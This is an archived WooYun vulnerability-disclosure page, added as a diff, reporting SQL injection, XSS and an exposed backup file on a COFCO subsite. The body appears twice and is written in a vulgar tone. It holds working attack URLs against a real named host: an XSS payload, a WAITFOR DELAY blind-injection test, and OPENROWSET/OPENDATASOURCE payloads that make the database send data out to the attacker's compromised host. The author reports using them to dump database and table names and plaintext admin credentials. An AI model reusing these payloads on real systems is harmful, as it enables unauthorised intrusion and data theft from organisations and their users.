@@ -1,0 +1,537 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		中粮集团某分站SQL注射一枚导致可被脱裤  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		中粮集团某分站SQL注射一枚导致可被脱裤  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/sql">sql</a> 
+</li><li>提交时间：		2013-10-26 08:24</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-10-26：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-10-31：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">中粮集团某分站SQL注射一枚导致可被脱裤</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">周末大好时光，屌丝们除了撸管，日站提交到乌云换QQ币，还有什么事情可以消磨时间吗？<br />
+<br />
+现在的女生真TM会装，<br />
+<br />
+昨晚和几个美女KTV小聚，最后走的时候女神说她喝醉了，<br />
+<br />
+要我送她回家，我说你TMD喝果汁也会醉？！<br />
+<br />
+幸亏老子机灵，要不今晚又耽误我日站了。<br />
+<br />
+<br />
+<br />
+打开我的神器开扫中粮的分站，一管撸完，发现已经出结果了。<br />
+<br />
+很幸运 扫出一个XSS， 一个备份文件下载，一个盲注。<br />
+<br />
+<br />
+<br />
+XSS：<br />
+<br />
+http://cofcomag.cofco.com//cn/periodical/old.aspx?periodical=934819&lt;/script&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;<br />
+<br />
+</p><p class="detail"><a href="../images/2603194830d787ddfc9999529e0547fef75be139.jpg" target="_blank"><img src="../images/2603194830d787ddfc9999529e0547fef75be139.jpg" alt="xss.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+就是弹个框意淫一下，本来不想提这个的，但我是一个很负责任的人，既然找出来了 就发给人家吧，回头一可以一并补了的。<br />
+<br />
+<br />
+<br />
+第二弹，<br />
+<br />
+备份文件下载，<br />
+<br />
+http://cofcomag.cofco.com/cn/periodical/web.rar<br />
+<br />
+<br />
+<br />
+看着名字很诱人，我以为是整站呢，谁知道就一个web.aspx。<br />
+<br />
+</p><p class="detail"><a href="../images/2603241404608efb14d8721323fb2acdee5bc01c.jpg" target="_blank"><img src="../images/2603241404608efb14d8721323fb2acdee5bc01c.jpg" alt="web.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+还是看第三弹吧。<br />
+<br />
+<br />
+<br />
+http://cofcomag.cofco.com//cn/periodical/old.aspx?periodical=934819<br />
+<br />
+<br />
+<br />
+神器报这个点是盲注。<br />
+<br />
+<br />
+<br />
+我用 1=1  1=2试了下，发现页面返回都一样。<br />
+<br />
+所以不知道是不是误报。<br />
+<br />
+<br />
+<br />
+为了稳妥起见，还是时间延迟一下吧。<br />
+<br />
+http://cofcomag.cofco.com/cn/periodical/old.aspx?periodical=934819&#039;WAITFOR DELAY &#039;00:00:10&#039;--<br />
+<br />
+执行后，看到浏览器左上角在那转了10秒钟，我就知道没有误报，语句是执行了。<br />
+<br />
+<br />
+<br />
+现在就是看数据库服务器能不能外连了。<br />
+<br />
+于是我想到了openrowset.<br />
+<br />
+登上肉鸡 监听443口。然后浏览器里执行<br />
+<br />
+http://cofcomag.cofco.com//cn/periodical/old.aspx?periodical=934819&#039;select a.* FROM OPENROWSET(&#039;SQLOLEDB&#039;,&#039;159.226.108.154,443&#039;;&#039;sa&#039;;&#039;sa&#039;,&#039;select * FROM pubs.dbo.authors&#039;) as a;--<br />
+<br />
+过了一会就返回来信息了。<br />
+<br />
+</p><p class="detail"><a href="../images/260334270ff914d2cdf384dee3aefe4123264c2f.jpg" target="_blank"><img src="../images/260334270ff914d2cdf384dee3aefe4123264c2f.jpg" alt="port4.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+这说明数据库服务器能外连的，这就好办了。哈哈。<br />
+<br />
+从返回的IP可以看出，应该是站库分离的，并且我扫了下 那个数据库服务器的IP一个口貌似都没开。<br />
+<br />
+<br />
+<br />
+既然有点了，还能外连，那就用工具脱裤吧。<br />
+<br />
+<br />
+<br />
+可等我上工具时，发现怎么都回不来数据，我顿时感到很困惑。<br />
+<br />
+接着我就在肉鸡监听1433口，看能不能回来，发现也没回来。<br />
+<br />
+这下我知道了，原来数据库服务器做了IPSEC，不能向外访问1433.<br />
+<br />
+这下就简单了，把肉鸡上的1433改成448端口，然后上工具，就出来结果了。<br />
+<br />
+</p><p class="detail"><a href="../images/26033954ec50df834cc1a5b1d8bf357931c05524.jpg" target="_blank"><img src="../images/26033954ec50df834cc1a5b1d8bf357931c05524.jpg" alt="1111.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+从图可以看到 是SQLSERVER2005  并且权限不大<br />
+<br />
+手里没0day 不好打，只能再看看库里的信息了。<br />
+<br />
+<br />
+<br />
+可是这时工具不好使了。可能是不支持2005吧。<br />
+<br />
+<br />
+<br />
+毛新宇他爷说过，自己动手，丰衣足食。<br />
+<br />
+手工来读数据吧。<br />
+<br />
+http://cofcomag.cofco.com//cn/periodical/old.aspx?periodical=934819&#039;insert into opendatasource(&#039;sqloledb&#039;,&#039;server=xx.xx.xx.xx,448;uid=sql;pwd=sql;database=test&#039;).test.dbo.haha select Name FROM Master..SysDatabases<br />
+<br />
+获取所有的库名。<br />
+<br />
+master<br />
+<br />
+tempdb<br />
+<br />
+model<br />
+<br />
+msdb<br />
+<br />
+cofco<br />
+<br />
+HSS<br />
+<br />
+cofcosms<br />
+<br />
+addresslist<br />
+<br />
+6szjj<br />
+<br />
+CofcoApp<br />
+<br />
+hr<br />
+<br />
+cofcodemo<br />
+<br />
+travel<br />
+<br />
+cofcodev<br />
+<br />
+EnterpriseSMS<br />
+<br />
+<br />
+<br />
+http://cofcomag.cofco.com//cn/periodical/old.aspx?periodical=934819&#039;insert into opendatasource(&#039;sqloledb&#039;,&#039;server=xx.xx.xx.xx,448;uid=sql;pwd=sql;database=test&#039;).tempdb.dbo.ku Select Name FROM cofco..SysObjects Where XType=&#039;U&#039;<br />
+<br />
+获取所有表名<br />
+<br />
+</p><p class="detail"><a href="../images/26034600e2403f4bc2dd24d8b5865300f069528e.jpg" target="_blank"><img src="../images/26034600e2403f4bc2dd24d8b5865300f069528e.jpg" alt="cofco.表名.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+最后获取管理员账号与密码。都是明文的哦。<br />
+<br />
+</p><p class="detail"><a href="../images/26034811b5adb4c9399d53d2f98e4c48924fa242.jpg" target="_blank"><img src="../images/26034811b5adb4c9399d53d2f98e4c48924fa242.jpg" alt="end.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+大家都知道 撸完管是很累的，所以我也没精力接着用账号密码登入后台，找上传，拿shell等等一系列的事了。 好累，真的该睡了。。。。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">周末大好时光，屌丝们除了撸管，日站提交到乌云换QQ币，还有什么事情可以消磨时间吗？<br />
+<br />
+现在的女生真TM会装，<br />
+<br />
+昨晚和几个美女KTV小聚，最后走的时候女神说她喝醉了，<br />
+<br />
+要我送她回家，我说你TMD喝果汁也会醉？！<br />
+<br />
+幸亏老子机灵，要不今晚又耽误我日站了。<br />
+<br />
+<br />
+<br />
+打开我的神器开扫中粮的分站，一管撸完，发现已经出结果了。<br />
+<br />
+很幸运 扫出一个XSS， 一个备份文件下载，一个盲注。<br />
+<br />
+<br />
+<br />
+XSS：<br />
+<br />
+http://cofcomag.cofco.com//cn/periodical/old.aspx?periodical=934819&lt;/script&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;<br />
+<br />
+</p><p class="detail"><a href="../images/2603194830d787ddfc9999529e0547fef75be139.jpg" target="_blank"><img src="../images/2603194830d787ddfc9999529e0547fef75be139.jpg" alt="xss.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+就是弹个框意淫一下，本来不想提这个的，但我是一个很负责任的人，既然找出来了 就发给人家吧，回头一可以一并补了的。<br />
+<br />
+<br />
+<br />
+第二弹，<br />
+<br />
+备份文件下载，<br />
+<br />
+http://cofcomag.cofco.com/cn/periodical/web.rar<br />
+<br />
+<br />
+<br />
+看着名字很诱人，我以为是整站呢，谁知道就一个web.aspx。<br />
+<br />
+</p><p class="detail"><a href="../images/2603241404608efb14d8721323fb2acdee5bc01c.jpg" target="_blank"><img src="../images/2603241404608efb14d8721323fb2acdee5bc01c.jpg" alt="web.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+还是看第三弹吧。<br />
+<br />
+<br />
+<br />
+http://cofcomag.cofco.com//cn/periodical/old.aspx?periodical=934819<br />
+<br />
+<br />
+<br />
+神器报这个点是盲注。<br />
+<br />
+<br />
+<br />
+我用 1=1  1=2试了下，发现页面返回都一样。<br />
+<br />
+所以不知道是不是误报。<br />
+<br />
+<br />
+<br />
+为了稳妥起见，还是时间延迟一下吧。<br />
+<br />
+http://cofcomag.cofco.com/cn/periodical/old.aspx?periodical=934819&#039;WAITFOR DELAY &#039;00:00:10&#039;--<br />
+<br />
+执行后，看到浏览器左上角在那转了10秒钟，我就知道没有误报，语句是执行了。<br />
+<br />
+<br />
+<br />
+现在就是看数据库服务器能不能外连了。<br />
+<br />
+于是我想到了openrowset.<br />
+<br />
+登上肉鸡 监听443口。然后浏览器里执行<br />
+<br />
+http://cofcomag.cofco.com//cn/periodical/old.aspx?periodical=934819&#039;select a.* FROM OPENROWSET(&#039;SQLOLEDB&#039;,&#039;159.226.108.154,443&#039;;&#039;sa&#039;;&#039;sa&#039;,&#039;select * FROM pubs.dbo.authors&#039;) as a;--<br />
+<br />
+过了一会就返回来信息了。<br />
+<br />
+</p><p class="detail"><a href="../images/260334270ff914d2cdf384dee3aefe4123264c2f.jpg" target="_blank"><img src="../images/260334270ff914d2cdf384dee3aefe4123264c2f.jpg" alt="port4.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+这说明数据库服务器能外连的，这就好办了。哈哈。<br />
+<br />
+从返回的IP可以看出，应该是站库分离的，并且我扫了下 那个数据库服务器的IP一个口貌似都没开。<br />
+<br />
+<br />
+<br />
+既然有点了，还能外连，那就用工具脱裤吧。<br />
+<br />
+<br />
+<br />
+可等我上工具时，发现怎么都回不来数据，我顿时感到很困惑。<br />
+<br />
+接着我就在肉鸡监听1433口，看能不能回来，发现也没回来。<br />
+<br />
+这下我知道了，原来数据库服务器做了IPSEC，不能向外访问1433.<br />
+<br />
+这下就简单了，把肉鸡上的1433改成448端口，然后上工具，就出来结果了。<br />
+<br />
+</p><p class="detail"><a href="../images/26033954ec50df834cc1a5b1d8bf357931c05524.jpg" target="_blank"><img src="../images/26033954ec50df834cc1a5b1d8bf357931c05524.jpg" alt="1111.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+从图可以看到 是SQLSERVER2005  并且权限不大<br />
+<br />
+手里没0day 不好打，只能再看看库里的信息了。<br />
+<br />
+<br />
+<br />
+可是这时工具不好使了。可能是不支持2005吧。<br />
+<br />
+<br />
+<br />
+毛新宇他爷说过，自己动手，丰衣足食。<br />
+<br />
+手工来读数据吧。<br />
+<br />
+http://cofcomag.cofco.com//cn/periodical/old.aspx?periodical=934819&#039;insert into opendatasource(&#039;sqloledb&#039;,&#039;server=xx.xx.xx.xx,448;uid=sql;pwd=sql;database=test&#039;).test.dbo.haha select Name FROM Master..SysDatabases<br />
+<br />
+获取所有的库名。<br />
+<br />
+master<br />
+<br />
+tempdb<br />
+<br />
+model<br />
+<br />
+msdb<br />
+<br />
+cofco<br />
+<br />
+HSS<br />
+<br />
+cofcosms<br />
+<br />
+addresslist<br />
+<br />
+6szjj<br />
+<br />
+CofcoApp<br />
+<br />
+hr<br />
+<br />
+cofcodemo<br />
+<br />
+travel<br />
+<br />
+cofcodev<br />
+<br />
+EnterpriseSMS<br />
+<br />
+<br />
+<br />
+http://cofcomag.cofco.com//cn/periodical/old.aspx?periodical=934819&#039;insert into opendatasource(&#039;sqloledb&#039;,&#039;server=xx.xx.xx.xx,448;uid=sql;pwd=sql;database=test&#039;).tempdb.dbo.ku Select Name FROM cofco..SysObjects Where XType=&#039;U&#039;<br />
+<br />
+获取所有表名<br />
+<br />
+</p><p class="detail"><a href="../images/26034600e2403f4bc2dd24d8b5865300f069528e.jpg" target="_blank"><img src="../images/26034600e2403f4bc2dd24d8b5865300f069528e.jpg" alt="cofco.表名.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+最后获取管理员账号与密码。都是明文的哦。<br />
+<br />
+</p><p class="detail"><a href="../images/26034811b5adb4c9399d53d2f98e4c48924fa242.jpg" target="_blank"><img src="../images/26034811b5adb4c9399d53d2f98e4c48924fa242.jpg" alt="end.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+大家都知道 撸完管是很累的，所以我也没精力接着用账号密码登入后台，找上传，拿shell等等一系列的事了。 好累，真的该睡了。。。。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">注入过滤<br />
+<br />
+删除备份文件<br />
+<br />
+XSS过滤<br />
+<br />
+ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/sql" title="sql">sql</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-041051" title="中粮集团某分站SQL注射一枚导致可被脱裤">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2013-10-26 08:24</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="41051";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
